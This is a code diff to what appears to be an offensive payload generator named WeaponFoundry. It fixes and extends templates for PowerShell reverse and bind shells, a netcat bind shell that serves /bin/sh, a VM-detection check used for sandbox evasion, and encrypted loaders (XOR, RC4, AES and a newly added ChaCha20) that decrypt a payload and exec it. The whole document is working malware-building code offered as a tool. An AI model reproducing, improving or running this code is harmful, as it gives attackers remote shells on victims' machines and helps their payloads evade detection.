@@ -471,7 +471,7 @@ while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
     $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
     $r=(iex $d 2>&1|Out-String);
     $r2=$r+"PS "+(pwd).Path+">";
-    $sb=([text.encoding]:ASCII).GetBytes($r2);
+    $sb=([text.encoding]::ASCII).GetBytes($r2);
     $s.Write($sb,0,$sb.Length);
     $s.Flush()
 }};
@@ -667,7 +667,7 @@ if time.time() - _s < {seconds - 0.5}:
         """Generate Python VM detection check."""
         return """
 import os,subprocess
-def _vm() -> Any:
+def _vm():
     try:
         o=subprocess.check_output("systemd-detect-virt",stderr=subprocess.DEVNULL).decode().strip()
         return o not in ["none",""]
@@ -709,7 +709,7 @@ class DecoderGenerator:
         key_hex = key.hex()
         return f"""
 import base64
-def _d(d,k) -> Any:
+def _d(d,k):
     return bytes([b^k[i%len(k)] for i,b in enumerate(d)])
 _k=bytes.fromhex("{key_hex}")
 _p=base64.b64decode(_e)
@@ -722,7 +722,7 @@ exec(_d(_p,_k))
         key_hex = key.hex()
         return f"""
 import base64
-def _rc4(d,k) -> Any:
+def _rc4(d,k):
     S=list(range(256));j=0
     for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]
     r=bytearray(len(d));i=j=0
@@ -742,17 +742,15 @@ import base64, hashlib
 try:
     from Crypto.Cipher import AES
 except ImportError:
-    # Recovery attempt: If pycryptodome is missing, this payload is dead weight
-    # but we log it as a hint for the operator.
-    logger.error("Error: pycryptodome required for AES payload execution")
+    print("Error: pycryptodome required for AES payload execution")
     import sys; sys.exit(1)
 
 _k=bytes.fromhex("{key_hex}")
 if len(_k)<32: _k=hashlib.sha256(_k).digest()
 _p=base64.b64decode(_e)
-_n=_p[:12]
-_t=_p[12:28]
-_c=_p[28:]
+_n=_p[:16]
+_t=_p[16:32]
+_c=_p[32:]
 _ci=AES.new(_k, AES.MODE_GCM, nonce=_n)
 exec(_ci.decrypt_and_verify(_c, _t))
 """
@@ -763,10 +761,31 @@ exec(_ci.decrypt_and_verify(_c, _t))
         key_int = key[0]
         return f"""
 $k={key_int}
-$d=[System.Convert]:FromBase64String($e)
+$d=[System.Convert]::FromBase64String($e)
 $r=@()
 for($i=0;$i -lt $d.Length;$i++){{$r+=$d[$i] -bxor $k}}
-iex([System.Text.Encoding]:ASCII.GetString($r))
+iex([System.Text.Encoding]::ASCII.GetString($r))
+"""
+
+    @staticmethod
+    def get_chacha20_decoder_python(key: bytes) -> str:
+        """Generate Python ChaCha20 decoder."""
+        key_hex = key.hex()
+        return f"""
+import base64, hashlib
+try:
+    from Crypto.Cipher import ChaCha20
+except ImportError:
+    print("Error: pycryptodome required for ChaCha20 payload execution")
+    import sys; sys.exit(1)
+
+_k=bytes.fromhex("{key_hex}")
+if len(_k)<32: _k=hashlib.sha256(_k).digest()
+_p=base64.b64decode(_e)
+_n=_p[:8]
+_c=_p[8:]
+_ci=ChaCha20.new(key=_k, nonce=_n)
+exec(_ci.decrypt(_c))
 """
 
 
@@ -914,7 +933,20 @@ class WeaponFoundry:
         if shell_type == ShellType.REVERSE_TCP:
             return self._get_reverse_tcp_payload(format, lhost, lport)
 
-        if shell_type == ShellType.BIND_TCP and format == PayloadFormat.PYTHON:
+        if shell_type == ShellType.BIND_TCP:
+            if format == PayloadFormat.PYTHON:
+                return self.templates.get_bind_shell_python(lport)
+            if format == PayloadFormat.POWERSHELL:
+                return (
+                    f"$l=New-Object System.Net.Sockets.TcpListener([IPAddress]::Any,{lport});$l.Start();"
+                    f"$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+                    f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+                    f"$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}}"
+                    f";$c.Close();$l.Stop()"
+                )
+            if format == PayloadFormat.BASH:
+                return f"nc -lvp {lport} -e /bin/sh"
+            # Fallback to Python for other formats
             return self.templates.get_bind_shell_python(lport)
 
         if shell_type == ShellType.PROCESS_INJECTION and format == PayloadFormat.PYTHON:
@@ -1075,6 +1107,8 @@ class WeaponFoundry:
                 return self.decoder.get_rc4_decoder_python(key)
             if encryption == EncryptionMethod.AES:
                 return self.decoder.get_aes_decoder_python(key)
+            if encryption == EncryptionMethod.CHACHA20:
+                return self.decoder.get_chacha20_decoder_python(key)
 
         elif format == PayloadFormat.POWERSHELL:
             if encryption == EncryptionMethod.XOR:
